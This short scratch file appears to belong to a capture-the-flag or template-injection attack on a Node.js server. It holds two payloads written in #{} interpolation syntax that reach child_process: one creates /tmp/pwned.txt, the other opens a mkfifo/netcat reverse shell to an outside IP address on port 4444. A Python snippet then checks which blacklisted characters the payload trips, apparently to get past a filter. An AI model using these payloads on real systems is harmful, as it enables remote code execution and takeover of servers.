#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").exec('touch /tmp/pwned.txt')}()}


blaclist = ["*","~","<",":","%"]
stra = '#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 103.236.140.14 4444 >/tmp/f")}()}'


for x in blaclist:
    if x in stra:
        print(x)